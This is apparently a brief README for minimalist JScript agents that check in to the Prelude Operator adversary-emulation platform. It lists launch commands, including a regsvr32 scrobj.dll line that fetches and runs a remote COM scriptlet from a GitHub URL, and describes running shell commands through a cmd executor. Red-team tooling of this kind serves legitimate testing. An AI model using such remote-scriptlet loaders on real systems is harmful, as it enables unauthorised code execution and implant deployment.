## Examples in JScript.

The simple agent checkin_minimalist.js, supports the cmd executor.

`cscript.exe checkin_minimalist.js`

## COM Scriptlet

`regsvr32.exe /s /u /i:https://raw.githubusercontent.com/secdev-01/PreludeOperator_QuickCheck/main/jscript/prelude_checkin.sct scrobj.dll`

## cscript

`cscript dotnet_interop.js`

Create a simple TTP that uses cmd executor

<img width="1000" alt="Screen Shot 2021-06-26 at 5 22 51 PM" src="https://user-images.githubusercontent.com/83469949/123528231-33159d80-d6a3-11eb-8cc3-2ccd2311c170.png">

STDOUT is returned as base64 encoded, so we don't have to deal with all the escaping etc...

Screen Shot 2021-06-26 at 5.17.40 PM<img width="777" alt="Screen Shot 2021-06-26 at 5 17 40 PM" src="https://user-images.githubusercontent.com/83469949/123528256-5f311e80-d6a3-11eb-90e2-c8cc0140eacf.png">


```
There is alot more to do here to make it more production ready, but in a sense these are some really simple building blocks

```
